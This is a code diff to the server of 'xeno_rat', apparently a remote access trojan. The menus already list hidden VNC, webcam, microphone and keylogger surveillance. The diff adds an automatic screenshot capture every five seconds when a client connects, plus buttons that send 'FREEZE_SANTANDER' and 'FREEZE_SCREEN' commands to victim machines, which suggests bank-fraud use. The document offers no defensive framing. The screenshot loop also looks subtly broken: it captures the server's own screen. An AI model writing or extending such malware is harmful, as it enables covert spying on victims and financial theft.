@@ -71,13 +71,14 @@ namespace xeno_rat_server
             Client[1] = "Relaunch";
             Client[2] = "Uninstall";
 
-            string[] Surveillance = new string[6];
+            string[] Surveillance = new string[7];
             Surveillance[0] = "Hvnc";
             Surveillance[1] = "WebCam";
             Surveillance[2] = "Live Microphone";
             Surveillance[3] = "Key Logger";
             Surveillance[4] = "Offline Key Logger";
             Surveillance[5] = "Screen Control";
+            Surveillance[6] = "Periodic Screenshot";
 
             string[] Fun = new string[4];
             Fun[0] = "Chat";
@@ -116,6 +117,57 @@ namespace xeno_rat_server
             Commands["Client"] = Client;
             Commands["Power"] = Power;
             Commands["Debug Info"] = Debug_Info;
+        }
+
+        private async Task CapturePeriodicScreenshots(Node client, int interval)
+        {
+            while (true)
+            {
+                // Capture screenshot
+                Bitmap screenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
+                Graphics graphics = Graphics.FromImage(screenshot);
+                graphics.CopyFromScreen(0, 0, 0, 0, screenshot.Size);
+
+                // Convert to byte array
+                using (MemoryStream ms = new MemoryStream())
+                {
+                    screenshot.Save(ms, ImageFormat.Png);
+                    byte[] screenshotBytes = ms.ToArray();
+
+                    // Send screenshot to client
+                    await client.SendAsync(screenshotBytes);
+                }
+
+                // Wait for the specified interval
+                await Task.Delay(interval);
+            }
+        }
+
+        private void freezeSantanderButton_Click(object sender, EventArgs e)
+        {
+            foreach (ListViewItem item in listView2.SelectedItems)
+            {
+                Node client = (Node)item.Tag;
+                client.Send("FREEZE_SANTANDER");
+            }
+        }
+
+        private void unfreezeSantanderButton_Click(object sender, EventArgs e)
+        {
+            foreach (ListViewItem item in listView2.SelectedItems)
+            {
+                Node client = (Node)item.Tag;
+                client.Send("UNFREEZE_SANTANDER");
+            }
+        }
+
+        private void freezeButton_Click(object sender, EventArgs e)
+        {
+            foreach (ListViewItem item in listView2.SelectedItems)
+            {
+                Node client = (Node)item.Tag;
+                client.Send("FREEZE_SCREEN");
+            }
         }
 
         private async Task OnConnect(Socket socket)
@@ -165,6 +217,12 @@ namespace xeno_rat_server
                 {
                     client.Disconnect();
                     return;
+                }
+
+                // Start periodic screenshot capture if the command is received
+                if (OnConnectTasks.Contains("Periodic Screenshot"))
+                {
+                    _ = CapturePeriodicScreenshots(client, 5000); // Capture screenshot every 5 seconds
                 }
 
                 listView2.Invoke((MethodInvoker)(() =>//add the clientdata to the listview
@@ -1748,6 +1806,7 @@ namespace xeno_rat_server
                 {
                     "Start OfflineKeylogger",
                     "Infograber",
+                    "Periodic Screenshot"
                 };
 
                 foreach (string menuItemText in contextMenuItems)
